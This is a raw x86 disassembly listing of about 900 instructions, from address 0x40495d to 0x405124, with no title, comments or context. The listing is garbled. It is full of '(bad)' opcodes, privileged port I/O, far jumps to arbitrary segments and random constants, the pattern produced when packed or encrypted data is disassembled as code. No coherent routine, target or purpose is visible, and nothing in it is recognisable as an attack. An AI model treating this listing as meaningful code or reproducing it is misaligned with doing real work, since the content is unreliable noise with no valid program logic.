  40495d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40495e:	sub    bl,bl
  404960:	dec    ebp
  404961:	and    al,0x37
  404963:	rol    ecx,1
  404965:	add    ebx,DWORD PTR [esi-0x1c6aa0b5]
  40496b:	aaa    
  40496c:	sti    
  40496d:	mov    edx,0xa81925e9
  404972:	test   DWORD PTR [eax],esi
  404974:	nop
  404975:	mov    edi,0xdf620e21
  40497a:	ss xchg ebx,eax
  40497c:	mov    al,0x35
  40497e:	lock pop ebx
  404980:	leave  
  404981:	lss    ebp,FWORD PTR [eax]
  404984:	out    dx,eax
  404985:	xor    eax,0x35eb2ae8
  40498a:	imul   esp,DWORD PTR [esi],0x73
  40498d:	(bad)  
  40498e:	(bad)  [edi-0x49925070]
  404994:	xchg   edx,eax
  404995:	les    eax,FWORD PTR [edx]
  404997:	mov    esi,0x87818660
  40499c:	add    al,0x4d
  40499e:	lods   eax,DWORD PTR ds:[esi]
  40499f:	(bad)  
  4049a0:	out    0xa0,al
  4049a2:	add    edi,DWORD PTR [esi-0x5e5ac09f]
  4049a8:	inc    edx
  4049a9:	neg    BYTE PTR [edi+0x26fe1a2f]
  4049af:	sti    
  4049b0:	(bad)  
  4049b1:	sar    DWORD PTR [edi],cl
  4049b3:	clc    
  4049b4:	shr    DWORD PTR [esp+ebp*4+0x66],0x74
  4049b9:	add    eax,0x504dec6a
  4049be:	loop   0x404964
  4049c0:	dec    edi
  4049c1:	enter  0x7396,0x26
  4049c5:	jnp    0x404a01
  4049c7:	aam    0xde
  4049c9:	(bad)  
  4049ca:	push   ebx
  4049cb:	dec    ebx
  4049cc:	je     0x4049eb
  4049ce:	push   ss
  4049cf:	push   0xffffffa5
  4049d1:	xor    DWORD PTR [edx],edx
  4049d3:	cmp    edx,DWORD PTR [esi]
  4049d5:	ins    DWORD PTR es:[edi],dx
  4049d6:	fist   WORD PTR [ecx+0x64abb0ce]
  4049dc:	dec    edi
  4049dd:	inc    esp
  4049de:	pusha  
  4049df:	pop    ebp
  4049e0:	push   esi
  4049e1:	retf   0xaf4
  4049e4:	rcr    BYTE PTR [edx+0x58],1
  4049e7:	std    
  4049e8:	pop    esi
  4049e9:	test   eax,0xe970a9c1
  4049ee:	loop   0x404a0b
  4049f0:	rcl    DWORD PTR [esi+0x3],0xc6
  4049f4:	aam    0x5f
  4049f6:	pop    ebp
  4049f7:	sti    
  4049f8:	iret   
  4049f9:	xor    ecx,ebp
  4049fb:	es mov cl,0xaf
  4049fe:	push   edx
  4049ff:	neg    ch
  404a01:	push   edi
  404a02:	outs   dx,DWORD PTR ds:[esi]
  404a03:	out    dx,eax
  404a04:	mov    WORD PTR [eax-0x2f1befd3],fs
  404a0a:	lods   eax,DWORD PTR ds:[esi]
  404a0b:	pop    ss
  404a0c:	xchg   edi,eax
  404a0d:	sahf   
  404a0e:	jnp    0x404a32
  404a10:	enter  0x6c52,0x80
  404a14:	stos   BYTE PTR es:[edi],al
  404a15:	dec    esi
  404a16:	mov    eax,ds:0x6822b00a
  404a1b:	sub    al,0x9f
  404a1d:	loope  0x4049cb
  404a1f:	jb     0x4049a9
  404a21:	push   es
  404a22:	test   eax,0xcca1cdee
  404a27:	je     0x404a6f
  404a29:	push   cs
  404a2a:	stos   DWORD PTR es:[edi],eax
  404a2b:	rol    ch,1
  404a2d:	je     0x404a04
  404a2f:	jb     0x404a9d
  404a31:	lock and ecx,edi
  404a34:	sti    
  404a35:	add    eax,0x600dbf66
  404a3a:	sub    DWORD PTR [eax-0x4f],eax
  404a3d:	xor    BYTE PTR [ebx-0x4db75411],bh
  404a43:	or     edi,0x1ac58cbc
  404a49:	cdq    
  404a4a:	loop   0x404aba
  404a4c:	and    BYTE PTR [ecx*8+0x2bdd9b9b],0x6a
  404a54:	adc    al,0x38
  404a56:	mov    edx,0xe9b37b4b
  404a5b:	jae    0x404a7e
  404a5d:	pop    esp
  404a5e:	loope  0x4049f3
  404a60:	xor    dl,BYTE PTR [esi+esi*8-0x2c]
  404a64:	fst    DWORD PTR [edi+0x1912bad7]
  404a6a:	xor    BYTE PTR ds:0xc7bca6d5,dh
  404a70:	(bad)  
  404a72:	clc    
  404a73:	or     BYTE PTR [esi+eiz*4+0x3e1644e6],cl
  404a7a:	mov    esi,DWORD PTR [ebp+0x3867b177]
  404a80:	mov    ah,0x55
  404a82:	lds    ecx,FWORD PTR [eax+0x7fe15a2d]
  404a88:	loop   0x404a33
  404a8a:	inc    ebx
  404a8b:	and    al,0x1c
  404a8d:	jge    0x404a31
  404a8f:	add    eax,0xcdf8eae9
  404a94:	and    BYTE PTR [edx],ah
  404a96:	pop    es
  404a97:	call   FWORD PTR [eax]
  404a99:	loopne 0x404a68
  404a9b:	retf   
  404a9c:	mov    eax,0x3d273886
  404aa1:	jg     0x404b22
  404aa3:	mov    edi,0x6ebf50f5
  404aa8:	(bad)  
  404aa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404aaa:	dec    ebx
  404aab:	or     cl,bh
  404aad:	aaa    
  404aae:	test   DWORD PTR [esi+0x62],esp
  404ab1:	inc    esp
  404ab2:	lahf   
  404ab3:	push   edx
  404ab4:	scas   eax,DWORD PTR es:[edi]
  404ab5:	xor    al,0x86
  404ab7:	sbb    eax,0x2c8c72e4
  404abc:	inc    edi
  404abd:	stos   DWORD PTR es:[edi],eax
  404abe:	mov    eax,ds:0xdb4941b6
  404ac3:	jmp    0x404b0b
  404ac5:	add    al,0xe4
  404ac7:	ret    
  404ac8:	mov    BYTE PTR [eax-0x13c2df5f],ch
  404ace:	out    dx,al
  404acf:	test   BYTE PTR [ebx-0x10b34ea6],ch
  404ad5:	inc    edi
  404ad6:	xchg   esp,eax
  404ad7:	lahf   
  404ad8:	and    dh,dl
  404ada:	iret   
  404adb:	inc    eax
  404adc:	ds pop ebx
  404ade:	adc    al,0x23
  404ae0:	repnz inc DWORD PTR [ebx-0x61a32c48]
  404ae7:	pop    ecx
  404ae8:	push   ecx
  404ae9:	and    dl,bh
  404aeb:	adc    eax,0x82af6b4c
  404af0:	call   0xa49e:0x9aafa186
  404af7:	psrad  mm5,QWORD PTR [edx]
  404afa:	push   ebp
  404afb:	inc    ebp
  404afc:	retf   
  404afd:	not    BYTE PTR [edi+0x4f11468f]
  404b03:	arpl   sp,si
  404b05:	aam    0x89
  404b07:	sub    al,0xe6
  404b09:	or     eax,0x46b1603f
  404b0e:	test   BYTE PTR [esi-0x2c0d80e3],dh
  404b14:	shr    BYTE PTR [eax+ecx*4-0x5239a870],1
  404b1b:	push   ebx
  404b1c:	outs   dx,DWORD PTR ds:[esi]
  404b1d:	jmp    0x404b2d
  404b1f:	push   ebx
  404b20:	in     eax,dx
  404b21:	push   edi
  404b22:	cmp    esi,esp
  404b24:	lds    esp,FWORD PTR [eax+0x5e858df]
  404b2a:	push   ebp
  404b2b:	jecxz  0x404ab8
  404b2d:	mov    dl,0x60
  404b2f:	push   ebp
  404b30:	dec    eax
  404b31:	frstor [edx-0x41282c84]
  404b37:	fsub   QWORD PTR [ebx]
  404b39:	sub    eax,0x45466c3b
  404b3e:	sub    eax,0x50cf95e3
  404b43:	je     0x404b5a
  404b45:	xor    ebp,DWORD PTR [edi-0x2e]
  404b48:	and    ah,0xd6
  404b4b:	xchg   edi,eax
  404b4c:	or     BYTE PTR [ecx+0x5c8890f7],bl
  404b52:	and    BYTE PTR ds:0xd737307c,ah
  404b58:	sbb    DWORD PTR [ebx-0x5f36e50d],0xffffff84
  404b5f:	retf   
  404b60:	mov    al,ds:0xdb8982b3
  404b65:	push   0xffffffc5
  404b67:	pop    ds
  404b68:	pusha  
  404b69:	jo     0x404b67
  404b6b:	aad    0xae
  404b6d:	scas   eax,DWORD PTR es:[edi]
  404b6e:	out    0x66,eax
  404b70:	jae    0x404bcb
  404b72:	adc    BYTE PTR [edi],bh
  404b74:	pop    es
  404b75:	add    DWORD PTR [esi],0xeb6ca164
  404b7b:	aam    0x14
  404b7d:	in     eax,0x91
  404b7f:	ret    
  404b80:	sub    BYTE PTR [edx-0x62],ch
  404b83:	mov    bh,0x91
  404b85:	push   cs
  404b86:	repnz cmp al,0x17
  404b89:	sub    ch,ch
  404b8b:	leave  
  404b8c:	or     DWORD PTR [edx],esi
  404b8e:	push   ebx
  404b8f:	inc    eax
  404b90:	or     DWORD PTR [esi-0x6286b5c7],esi
  404b96:	push   eax
  404b97:	or     DWORD PTR [ebp+0x12],ecx
  404b9a:	mov    bl,0x94
  404b9c:	cmp    eax,0xca94669a
  404ba1:	and    ecx,esp
  404ba3:	neg    BYTE PTR [ebx-0x6ed3cdf6]
  404ba9:	imul   esi,DWORD PTR [edi+0x15],0xfffffff6
  404bad:	mov    DWORD PTR [edi-0x3400a9b9],esp
  404bb3:	jl     0x404b94
  404bb5:	push   ebp
  404bb6:	imul   esp,DWORD PTR [edx-0xc],0xffffffe1
  404bba:	sub    al,0x7f
  404bbc:	or     BYTE PTR [ebx],dl
  404bbe:	imul   esi,DWORD PTR [edx+0x18b6fffc],0xffffffb4
  404bc5:	shl    BYTE PTR [ebp+0x4d92fe06],cl
  404bcb:	push   0x65
  404bcd:	lahf   
  404bce:	mov    esi,0xcb066a38
  404bd3:	sbb    esi,ebp
  404bd5:	sub    al,0x66
  404bd7:	push   0x39
  404bd9:	and    BYTE PTR [eax-0x18cd59f4],bh
  404bdf:	push   ebp
  404be0:	stc    
  404be1:	(bad)  ds:0xec26b636
  404be7:	cli    
  404be8:	sbb    dl,BYTE PTR [edx+0x47]
  404beb:	sub    eax,0x31c93223
  404bf0:	gs mov ebx,0xcd283cbf
  404bf6:	sub    DWORD PTR [ebx+0x3d441559],eax
  404bfc:	call   0x613:0x2e87db2c
  404c03:	pop    es
  404c04:	mov    gs,ebp
  404c06:	mov    ebp,0x4abe99d0
  404c0b:	(bad)  
  404c0c:	frstor [eax-0x39]
  404c0f:	adc    DWORD PTR [edx-0x56],0x4
  404c13:	inc    ebx
  404c14:	stc    
  404c15:	cmp    DWORD PTR [eax],esi
  404c17:	and    eax,DWORD PTR [ebp+eiz*4+0x1]
  404c1b:	lock loopne 0x404bc7
  404c1e:	std    
  404c1f:	jns    0x404c04
  404c21:	test   eax,0x36bd2658
  404c26:	in     eax,dx
  404c27:	je     0x404bb4
  404c29:	pop    ss
  404c2a:	retf   0xbefc
  404c2d:	data16 out 0x79,al
  404c30:	xor    eax,DWORD PTR [eax]
  404c32:	ror    ecx,1
  404c34:	mov    dh,0x49
  404c36:	std    
  404c37:	xchg   ebx,eax
  404c38:	rol    BYTE PTR [ecx],0xe3
  404c3b:	sub    ecx,DWORD PTR [edx-0x42]
  404c3e:	pop    ebp
  404c3f:	sti    
  404c40:	ins    DWORD PTR es:[edi],dx
  404c41:	xchg   edi,eax
  404c42:	jne    0x404c81
  404c44:	test   eax,0xfbace33d
  404c49:	pop    eax
  404c4a:	sbb    BYTE PTR [edi+0x7e],dh
  404c4d:	ins    BYTE PTR es:[edi],dx
  404c4e:	in     al,dx
  404c4f:	pop    edx
  404c50:	inc    edx
  404c51:	xor    ebp,DWORD PTR [ecx+ebp*4+0x2f76c4a9]
  404c58:	inc    esi
  404c59:	jae    0x404c7d
  404c5b:	xchg   edi,eax
  404c5c:	std    
  404c5d:	mov    ds:0x1fb76cd1,al
  404c62:	int    0x8
  404c64:	aas    
  404c65:	lods   eax,DWORD PTR ds:[esi]
  404c66:	mov    ds:0x97ee6e17,eax
  404c6b:	sbb    eax,0x9dd8ddbd
  404c70:	sbb    esp,DWORD PTR [esi]
  404c72:	jecxz  0x404c0b
  404c74:	rcpps  xmm5,XMMWORD PTR [eax]
  404c77:	and    BYTE PTR [bx+si+0x4e],bl
  404c7b:	aaa    
  404c7c:	aas    
  404c7d:	push   esp
  404c7e:	push   ds
  404c7f:	adc    BYTE PTR [ebx+ebx*4-0x353933a7],bl
  404c86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c87:	icebp  
  404c88:	ret    0x6d3
  404c8b:	stc    
  404c8c:	sbb    BYTE PTR [ebp+0x2ee78f96],0x1d
  404c93:	mov    edi,ebp
  404c95:	cmc    
  404c96:	jmp    0x572f:0xaab93c80
  404c9d:	push   esi
  404c9e:	popf   
  404c9f:	imul   eax,edx,0xffffffac
  404ca2:	scas   al,BYTE PTR es:[edi]
  404ca3:	into   
  404ca4:	xor    al,BYTE PTR [edx]
  404ca6:	mov    al,0x63
  404ca8:	dec    eax
  404ca9:	mov    al,ds:0x4669a716
  404cae:	mov    edi,0x83f2d440
  404cb3:	aas    
  404cb4:	inc    esi
  404cb5:	out    0x4d,eax
  404cb7:	pop    esp
  404cb8:	jge    0x404c76
  404cba:	xchg   esp,eax
  404cbb:	adc    BYTE PTR [ebx+0xdbbb5a0],0x47
  404cc2:	cs scas al,BYTE PTR es:[edi]
  404cc4:	dec    esi
  404cc5:	js     0x404d3b
  404cc7:	dec    ecx
  404cc8:	outs   dx,BYTE PTR ds:[esi]
  404cc9:	cmp    eax,0xa6e1e0bb
  404cce:	stos   BYTE PTR es:[edi],al
  404ccf:	aam    0xb5
  404cd1:	call   0x8ada1838
  404cd6:	loopne 0x404c68
  404cd8:	(bad)  
  404cd9:	sub    esi,DWORD PTR [eax+0x44]
  404cdc:	cld    
  404cdd:	jmp    0xe74497c9
  404ce2:	cmp    ch,dl
  404ce4:	xchg   esp,eax
  404ce5:	outs   dx,DWORD PTR ds:[esi]
  404ce6:	imul   ecx,DWORD PTR [ebx-0x75],0xffffffc8
  404cea:	cmc    
  404ceb:	jb     0x404c79
  404ced:	mov    esi,eax
  404cef:	inc    edi
  404cf0:	ret    
  404cf1:	mov    edx,0xdc7962b9
  404cf6:	jp     0x404d36
  404cf8:	outs   dx,DWORD PTR ds:[esi]
  404cf9:	jle    0x404d77
  404cfb:	mov    ds:0x79d5e7e9,al
  404d00:	pop    ds
  404d01:	ret    0xba7a
  404d04:	sbb    BYTE PTR ss:[ecx-0x16],bl
  404d08:	or     BYTE PTR [ebp+0x2b],ch
  404d0b:	lods   al,BYTE PTR ds:[esi]
  404d0c:	hlt    
  404d0d:	mov    ch,0xc
  404d0f:	not    ecx
  404d11:	or     DWORD PTR [ebx-0x43],ebp
  404d14:	xor    al,0xbb
  404d16:	call   0xefa9:0xe90c4520
  404d1d:	cmp    dh,BYTE PTR [ebp-0x206ef6d]
  404d23:	mov    eax,0x1a64d759
  404d28:	and    ecx,DWORD PTR [ecx-0x65]
  404d2b:	xchg   DWORD PTR [edx-0x35ea1228],ebp
  404d31:	xor    edi,ebp
  404d33:	add    bh,BYTE PTR [edx+0x6638a71e]
  404d39:	xchg   ebx,eax
  404d3a:	cmp    DWORD PTR [esi-0x46],eax
  404d3d:	xchg   esp,eax
  404d3e:	xor    DWORD PTR [edi+0x37],0x12
  404d42:	jmp    0x61c5:0x69ce5936
  404d49:	imul   eax,DWORD PTR [eax+0x51d09b9b],0xffffff90
  404d50:	es std 
  404d52:	jmp    0x404d58
  404d54:	lods   eax,DWORD PTR ds:[esi]
  404d55:	pop    ds
  404d56:	in     al,0x60
  404d58:	cmp    DWORD PTR cs:[ebx],edx
  404d5b:	shr    esp,0x30
  404d5e:	and    dl,BYTE PTR [eax+ebp*4+0x2d]
  404d62:	mov    BYTE PTR [eax-0xf4d06c3],ah
  404d68:	dec    ebx
  404d69:	and    ebp,DWORD PTR [ebx-0x31621b78]
  404d6f:	test   DWORD PTR [ebx-0x57],esi
  404d72:	jmp    0x1c8ddc5d
  404d77:	xchg   BYTE PTR [eax-0x3eb9298b],dh
  404d7d:	not    DWORD PTR [edi-0x45695fac]
  404d83:	inc    ebp
  404d84:	dec    ebx
  404d85:	lds    ebx,FWORD PTR [edi-0x79a70d8e]
  404d8b:	mov    ebx,0x3a3b942c
  404d90:	daa    
  404d91:	sbb    BYTE PTR [ebx+edx*1],0x2d
  404d95:	loopne 0x404e02
  404d97:	dec    eax
  404d98:	xor    ah,cl
  404d9a:	scas   eax,DWORD PTR es:[edi]
  404d9b:	rep lods eax,DWORD PTR ds:[esi]
  404d9d:	jbe    0x404dda
  404d9f:	in     al,0x54
  404da1:	out    0xb,al
  404da3:	mov    edi,0x694f912a
  404da8:	sub    esi,DWORD PTR [edx*2+0x5f76e8e3]
  404daf:	push   ss
  404db0:	or     ebp,ebx
  404db2:	fcmove st,st(0)
  404db4:	dec    eax
  404db5:	add    bh,ah
  404db7:	inc    ecx
  404db8:	mov    esp,0xdf700845
  404dbd:	push   esp
  404dbe:	mov    bh,0xd
  404dc0:	sub    DWORD PTR [ebx-0x11],esi
  404dc3:	jnp    0x404d8f
  404dc5:	loop   0x404db9
  404dc7:	jecxz  0x404dcb
  404dc9:	(bad)  
  404dca:	ja     0x404d67
  404dcc:	hlt    
  404dcd:	xor    eax,0x5f87766d
  404dd2:	and    al,0xe0
  404dd4:	jecxz  0x404e47
  404dd6:	mov    ah,0x1c
  404dd8:	shl    cl,0xbd
  404ddb:	neg    BYTE PTR [edi]
  404ddd:	lahf   
  404dde:	sbb    DWORD PTR ds:0xb6789a6c,edx
  404de4:	jne    0x404da7
  404de6:	jg     0x404df6
  404de8:	arpl   WORD PTR [esi+0x5c],di
  404deb:	sti    
  404dec:	pop    es
  404ded:	test   BYTE PTR [eax+ebx*1],0x7a
  404df1:	ds sub eax,esp
  404df4:	mov    bh,0xb1
  404df6:	add    DWORD PTR [ecx+0x372cf4d7],edx
  404dfc:	hlt    
  404dfd:	ins    BYTE PTR es:[edi],dx
  404dfe:	inc    DWORD PTR [ecx]
  404e00:	xor    ebx,DWORD PTR ds:[ebx]
  404e03:	jno    0x404e7e
  404e05:	xor    DWORD PTR [edi-0x3c460727],edx
  404e0b:	loop   0x404d97
  404e0d:	repz pop esi
  404e0f:	jb     0x404e88
  404e11:	dec    ebp
  404e12:	sbb    BYTE PTR [edx+0x52],dl
  404e15:	mov    edi,0x5f040f87
  404e1a:	in     eax,dx
  404e1b:	mov    dl,0x8c
  404e1d:	add    bl,BYTE PTR [eax]
  404e1f:	xchg   ecx,eax
  404e20:	aaa    
  404e21:	mov    bl,0xb3
  404e23:	lods   al,BYTE PTR ds:[esi]
  404e24:	push   ds
  404e25:	lods   eax,DWORD PTR ds:[esi]
  404e26:	jmp    0x3e13b1a8
  404e2b:	or     BYTE PTR [ebx+0x7b7a9bb6],bl
  404e31:	stos   DWORD PTR es:[edi],eax
  404e32:	pop    ds
  404e33:	cmp    eax,0x1309dbf3
  404e38:	data16 mov bl,BYTE PTR [edi+0x19e926f9]
  404e3f:	mov    dh,0xd
  404e41:	add    DWORD PTR [esi],edx
  404e43:	xor    eax,0x11e6ddfa
  404e48:	test   BYTE PTR [eax+0x3c],dl
  404e4b:	pop    edx
  404e4c:	test   eax,0x939d7c37
  404e51:	mov    dl,0x26
  404e53:	xchg   ecx,eax
  404e54:	mov    WORD PTR [eax],?
  404e56:	neg    BYTE PTR [ebx+0x61a521e3]
  404e5c:	daa    
  404e5d:	xor    al,0x6e
  404e5f:	mov    cl,0x96
  404e61:	(bad)  
  404e62:	test   al,0x17
  404e64:	shr    ebp,cl
  404e66:	cs hlt 
  404e68:	sbb    eax,0x847c76f7
  404e6d:	adc    BYTE PTR [esp+ebp*8-0x63],0x97
  404e72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e73:	xchg   ecx,eax
  404e74:	push   ebp
  404e75:	jl     0x404ed0
  404e77:	inc    ecx
  404e78:	pop    ebp
  404e79:	jno    0x404edf
  404e7b:	ret    
  404e7c:	mov    ah,0xc5
  404e7e:	xchg   esp,eax
  404e7f:	lods   eax,DWORD PTR ds:[esi]
  404e80:	fwait
  404e81:	outs   dx,BYTE PTR ds:[esi]
  404e82:	mov    dh,0x7c
  404e84:	jmp    0x404e64
  404e86:	(bad)  
  404e88:	sti    
  404e89:	test   DWORD PTR [eax+esi*4],ebx
  404e8c:	or     al,0xb6
  404e8e:	ins    BYTE PTR es:[edi],dx
  404e8f:	jae    0x404e64
  404e91:	fidiv  DWORD PTR [ebp-0x4c]
  404e94:	pop    ecx
  404e95:	mov    ds,WORD PTR [edi-0x3e2dcf9c]
  404e9b:	mov    esi,0xaaae175e
  404ea0:	mov    dl,0xbc
  404ea2:	and    ebx,edi
  404ea4:	mov    edi,0x176ee68e
  404ea9:	dec    eax
  404eaa:	imul   eax,DWORD PTR [ebp+0x325b6b65],0x7ff823f5
  404eb4:	sar    BYTE PTR [edi],0x94
  404eb7:	push   0xf73e70d9
  404ebc:	sbb    al,0x26
  404ebe:	lds    ecx,FWORD PTR [edi]
  404ec0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ec1:	scas   eax,DWORD PTR es:[edi]
  404ec2:	lea    ebp,[ecx+0x648c1bd1]
  404ec8:	push   edx
  404ec9:	jbe    0x404e7a
  404ecb:	push   ebp
  404ecc:	arpl   cx,cx
  404ece:	mov    ss,WORD PTR [ebx-0x6166ee2b]
  404ed4:	div    DWORD PTR [edi-0x2f]
  404ed7:	std    
  404ed8:	sbb    dl,BYTE PTR [ecx+edx*1-0x30]
  404edc:	push   es
  404edd:	add    BYTE PTR [ecx],0x2c
  404ee0:	aad    0xfc
  404ee2:	sub    ah,BYTE PTR [edi+0x5845ba4c]
  404ee8:	out    dx,eax
  404ee9:	xchg   ebx,eax
  404eea:	out    dx,al
  404eeb:	pop    ebp
  404eec:	push   esi
  404eed:	pop    ebp
  404eee:	out    0x4b,al
  404ef0:	cmp    BYTE PTR [esi+ecx*4-0x55],ah
  404ef4:	push   ds
  404ef5:	adc    DWORD PTR [ecx+0x54],edi
  404ef8:	mov    ebp,0x10776dbc
  404efd:	jne    0x404ec1
  404eff:	sbb    eax,0x6dfc60c6
  404f04:	dec    eax
  404f05:	xchg   BYTE PTR [esi+0x4a],bh
  404f08:	dec    esi
  404f09:	xlat   BYTE PTR ds:[ebx]
  404f0a:	mov    ebp,0x11c7599f
  404f0f:	sub    eax,0xe8c06d98
  404f14:	sbb    DWORD PTR [ebx+ecx*1+0xb4ca713],0x2b775d1c
  404f1f:	or     BYTE PTR [esi+0x234762cc],bl
  404f25:	scas   al,BYTE PTR es:[edi]
  404f26:	mov    ecx,?
  404f28:	fbld   TBYTE PTR [ebp+eiz*2-0x3a]
  404f2c:	push   edx
  404f2d:	add    dh,BYTE PTR [edx+0x6a96db8d]
  404f33:	(bad)  
  404f35:	jecxz  0x404fb2
  404f37:	mov    dh,0x75
  404f39:	(bad)  
  404f3a:	dec    ebp
  404f3b:	imul   eax,DWORD PTR [edi+0x6173c1f8],0x6b
  404f42:	test   eax,0x910d6bd1
  404f47:	or     BYTE PTR [edi],dh
  404f49:	out    dx,al
  404f4a:	cs xor eax,0x2daba149
  404f50:	icebp  
  404f51:	dec    eax
  404f52:	repz rol BYTE PTR [ecx-0x79],cl
  404f56:	xchg   BYTE PTR ds:0x8cf0f925,ch
  404f5c:	(bad)  
  404f5d:	fsub   DWORD PTR [ebx]
  404f5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f60:	imul   edx,DWORD PTR [ebp+0x53],0x67
  404f64:	arpl   di,bx
  404f66:	dec    edx
  404f67:	pop    ebx
  404f68:	dec    ebx
  404f69:	inc    eax
  404f6a:	popa   
  404f6b:	jno    0x404f57
  404f6d:	les    edx,FWORD PTR ds:0x4784e768
  404f73:	mov    al,ds:0x71b94c20
  404f78:	add    BYTE PTR [ebp+0x3e],ah
  404f7b:	sub    dl,BYTE PTR [esi]
  404f7d:	rcl    BYTE PTR [ecx+ecx*4+0x4d],0x92
  404f82:	jnp    0x404f15
  404f84:	scas   eax,DWORD PTR es:[edi]
  404f85:	sbb    DWORD PTR [ebx],esi
  404f87:	cdq    
  404f88:	dec    ecx
  404f89:	and    eax,0x481670db
  404f8e:	inc    eax
  404f8f:	inc    ebp
  404f90:	or     ecx,DWORD PTR [ebp+0x47446bd5]
  404f96:	adc    DWORD PTR [edi+0x66],ecx
  404f99:	fbld   TBYTE PTR [esi+0x68]
  404f9c:	gs jp  0x404f91
  404f9f:	cdq    
  404fa0:	inc    edi
  404fa1:	rcr    eax,1
  404fa3:	test   eax,0xb25bc48d
  404fa8:	loop   0x404f39
  404faa:	es xor al,0x6b
  404fad:	add    eax,0xbb05dab4
  404fb2:	pop    edx
  404fb3:	inc    esi
  404fb4:	loope  0x404ff7
  404fb6:	stos   BYTE PTR es:[edi],al
  404fb7:	das    
  404fb8:	dec    edi
  404fb9:	and    cl,BYTE PTR [esi]
  404fbb:	sub    DWORD PTR [ecx-0x61],edi
  404fbe:	sub    esi,ebp
  404fc0:	nop
  404fc1:	fidivr WORD PTR ds:0xb005f970
  404fc7:	xor    BYTE PTR [edi+0x3c],dh
  404fca:	mov    ecx,0xb1c108b8
  404fcf:	cdq    
  404fd0:	scas   al,BYTE PTR es:[edi]
  404fd1:	mov    BYTE PTR [eax],bh
  404fd3:	mov    esp,0x3e80a607
  404fd8:	jl     0x404fee
  404fda:	cmp    eax,0x324c1b81
  404fdf:	mov    bh,0x3b
  404fe1:	leave  
  404fe2:	jno    0x404f93
  404fe4:	aas    
  404fe5:	daa    
  404fe6:	inc    eax
  404fe7:	fsub   DWORD PTR [ecx+0x1b4b1bb1]
  404fed:	jnp    0x404fda
  404fef:	(bad)  
  404ff1:	scas   eax,DWORD PTR es:[edi]
  404ff2:	div    DWORD PTR [esi+0x34]
  404ff5:	mov    ds:0x77bc713c,al
  404ffa:	push   cs
  404ffb:	mov    cl,0x73
  404ffd:	jne    0x404fb3
  404fff:	pop    ds
  405000:	add    eax,0xb5af9e3f
  405005:	fidivr DWORD PTR [ecx-0x2d]
  405008:	push   ds
  405009:	xor    dh,BYTE PTR [ecx]
  40500b:	out    0x60,al
  40500d:	dec    esi
  40500e:	push   0x57
  405010:	sub    DWORD PTR [si],0xffffffe9
  405014:	push   0x85a9302a
  405019:	cmp    DWORD PTR [eax-0x1cc92408],0x7750d273
  405023:	adc    DWORD PTR [ecx-0x13],esp
  405026:	mov    cl,0xc5
  405028:	retf   
  405029:	fdivr  st(3),st
  40502b:	dec    ebx
  40502c:	sub    BYTE PTR [ebp+0x27b1d542],dl
  405032:	xor    dl,BYTE PTR [ebx-0x2678ed77]
  405038:	cwde   
  405039:	xor    al,0x8
  40503b:	leave  
  40503c:	je     0x40506a
  40503e:	outs   dx,BYTE PTR ds:[esi]
  40503f:	sbb    DWORD PTR [edi-0x74],esi
  405042:	(bad)  
  405044:	sub    edx,DWORD PTR [esi*4+0x26235c8c]
  40504b:	xchg   edx,eax
  40504c:	push   eax
  40504d:	enter  0xa288,0xac
  405051:	jns    0x405085
  405053:	adc    eax,0x133a423
  405058:	mov    ebp,0x7347e51c
  40505d:	adc    DWORD PTR [ecx],ebp
  40505f:	cld    
  405060:	nop
  405061:	pop    dx
  405063:	adc    al,ch
  405065:	mov    DWORD PTR ds:0x617d42e3,ebx
  40506b:	and    esi,DWORD PTR [esi+0x70dde9e0]
  405071:	arpl   WORD PTR [esi+0x36],cx
  405074:	mov    WORD PTR [ebp-0x70],ss
  405077:	jns    0x405050
  405079:	rcl    BYTE PTR [edi+0x4e],1
  40507c:	pop    esp
  40507d:	mov    ebp,0x12073b2c
  405082:	push   cs
  405083:	mov    ecx,fs
  405085:	cmp    al,0x61
  405087:	imul   edx,ebx,0x53
  40508a:	lahf   
  40508b:	xchg   edi,eax
  40508c:	test   al,0x99
  40508e:	pop    ecx
  40508f:	mov    al,0xe9
  405091:	shr    DWORD PTR [ebx+edi*1+0x163def26],cl
  405098:	push   edx
  405099:	pop    eax
  40509a:	push   0x1
  40509c:	cmp    dh,BYTE PTR [eax-0x7c7442eb]
  4050a2:	(bad)  
  4050a3:	test   eax,0xc7d56dff
  4050a8:	std    
  4050a9:	xchg   DWORD PTR [edx],ecx
  4050ab:	xor    dh,BYTE PTR [ecx]
  4050ad:	pop    ds
  4050ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050af:	lea    ecx,[ebp-0x2c]
  4050b2:	pop    edx
  4050b3:	retf   0xe8ab
  4050b6:	mov    BYTE PTR [ebp-0x17],0xb5
  4050ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050bb:	xor    BYTE PTR [edi],dl
  4050bd:	das    
  4050be:	adc    al,0x29
  4050c0:	rcl    DWORD PTR [ecx+0x2515e52e],cl
  4050c6:	xor    dh,BYTE PTR [ecx+0x75bf3d8]
  4050cc:	push   edx
  4050cd:	jmp    0x4050bb
  4050cf:	in     al,0x88
  4050d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050d2:	sub    DWORD PTR ds:0x4ff0380b,ecx
  4050d8:	shr    edx,0xc8
  4050db:	es cwde 
  4050dd:	jmp    0x4426:0x3fc07738
  4050e4:	mov    BYTE PTR [esp+edi*1],0x91
  4050e8:	xchg   esp,eax
  4050e9:	div    BYTE PTR [edi+0x729ca86d]
  4050ef:	call   0x349:0xcbf0ccca
  4050f6:	sahf   
  4050f7:	push   ebx
  4050f8:	jo     0x405089
  4050fa:	sbb    eax,0xc3c6a82e
  4050ff:	ins    BYTE PTR es:[edi],dx
  405100:	pop    eax
  405101:	ret    
  405102:	pop    esi
  405103:	lods   eax,DWORD PTR ds:[esi]
  405104:	mov    al,ds:0xd390f8a8
  405109:	mov    cl,0xba
  40510b:	jnp    0x405167
  40510d:	(bad)  
  40510e:	fnsave ss:[edx]
  405111:	rcr    BYTE PTR [edi-0x58eef4ed],cl
  405117:	sbb    DWORD PTR [ecx-0x49148150],ebp
  40511d:	jg     0x405179
  40511f:	cmp    DWORD PTR [edi],edx
  405121:	rcl    DWORD PTR [edi+0x55],cl
  405124:	adc    DWORD PTR [esi],edi
